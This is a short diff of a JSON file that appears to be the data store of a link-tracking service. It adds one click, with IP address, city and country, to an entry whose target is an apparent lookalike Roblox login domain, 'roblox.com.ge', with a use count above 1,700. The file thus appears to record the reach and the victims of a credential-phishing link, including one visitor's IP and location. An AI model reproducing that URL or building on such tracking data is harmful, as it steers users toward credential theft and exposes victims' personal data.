@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1720,
+    "useCount": 1721,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13928,6 +13928,14 @@
         "city": "Avon",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1784014013127,
+        "ip": "38.156.230.48",
+        "country": "Colombia",
+        "city": "Medellín",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
